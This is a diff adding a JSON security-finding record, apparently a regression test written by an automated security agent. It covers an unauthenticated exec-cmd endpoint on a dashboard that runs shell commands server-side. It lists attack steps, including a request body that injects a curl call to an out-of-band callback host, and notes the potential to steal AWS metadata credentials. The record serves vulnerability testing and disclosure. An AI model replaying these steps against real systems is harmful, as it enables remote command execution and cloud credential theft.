@@ -1,0 +1,62 @@
+{
+  "id": "SEC-f-38aefc",
+  "devops_space_id": "7e86205f-79ea-4992-b1f3-eb5d24a1a439",
+  "name": "SSRF via Unauthenticated Command Execution in Scenario Run exec-cmd Endpoint",
+  "description": "The Dashboard application exposes an unauthenticated endpoint `/api/scenario-run/{run_id}/exec-cmd` that accepts a `command` field in the JSON body and executes it server-side via subprocess. This allows an attacker to force the server to make arbitrary outbound HTTP/DNS requests to attacker-controlled URLs by passing commands like `curl <attacker_url>`. The endpoint requires no authentication whatsoever.\n\nThe attack chain is:\n1. Start a scenario run via POST /api/scenario-run/{scenario_id} (no auth required) to obtain a run_id\n2. Use the exec-cmd endpoint with the run_id to execute arbitrary commands including curl/wget to attacker-controlled URLs\n\nThe server runs on a container with kubectl access and AWS IAM role permissions (SecretsManagerReadWrite, DynamoDB, Bedrock, CloudWatch), making this SSRF exploitable for:\n- AWS metadata service access (169.254.169.254) for credential theft\n- Internal service enumeration and data exfiltration\n- Cloud infrastructure lateral movement\n- Accessing internal APIs and databases not exposed externally\n\nImpact: An attacker can make the server issue requests to any internal or external URL, potentially accessing cloud metadata credentials, internal services, and sensitive data. The underlying mechanism is command injection which makes this even more severe than typical SSRF.",
+  "category": "security-FrontierAgentHub",
+  "app_name": "FrontierAgentHub",
+  "layer": "app",
+  "target_service": "FrontierAgentHub",
+  "failure_mode": "SERVER_SIDE_REQUEST_FORGERY",
+  "purpose": "보안 취약점 회귀 테스트",
+  "expected_root_cause": "SERVER_SIDE_REQUEST_FORGERY 취약점 — SSRF via Unauthenticated Command Execution in Scenario Run exec-cmd Endpoint",
+  "source": "security-agent",
+  "finding_id": "f-38aefc10-d4c4-4f87-99cd-728039a9f3e5",
+  "risk_level": "CRITICAL",
+  "risk_type": "SERVER_SIDE_REQUEST_FORGERY",
+  "endpoint": "http://dashboard.es-devops-agent.com/api/scenario-run",
+  "attack_steps": [
+    {
+      "method": "POST",
+      "path": "/api/scenario-run/FM-01-network-isolation?space_id=",
+      "headers": {},
+      "body": null,
+      "expected_status": null,
+      "description": ""
+    },
+    {
+      "method": "POST",
+      "path": "/api/scenario-run/c5e27f81/exec-cmd",
+      "headers": {},
+      "body": "{\"command\": \"curl http://PEN-FAZH-5095-7454.dns.collabp-reg1.devops.aws.dev\"}",
+      "expected_status": null,
+      "description": ""
+    }
+  ],
+  "topology_edges": [
+    {
+      "from": "attacker",
+      "to": "alb",
+      "label": "HTTP"
+    },
+    {
+      "from": "alb",
+      "to": "dashboard",
+      "label": "/api/scenario-run/FM-01-network-isolation?space_id="
+    }
+  ],
+  "registered_at": "2026-06-16T06:42:17.884168+00:00",
+  "trigger": {
+    "type": "security-attack",
+    "command": "# Attack: SERVER_SIDE_REQUEST_FORGERY on dashboard\n# Endpoint: http://dashboard.es-devops-agent.com/api/scenario-run/api/scenario-run/FM-01-network-isolation?space_id="
+  },
+  "verification": {
+    "steps": [
+      {
+        "type": "security_check",
+        "description": "SERVER_SIDE_REQUEST_FORGERY 방어 확인",
+        "expected": "defended"
+      }
+    ]
+  }
+}
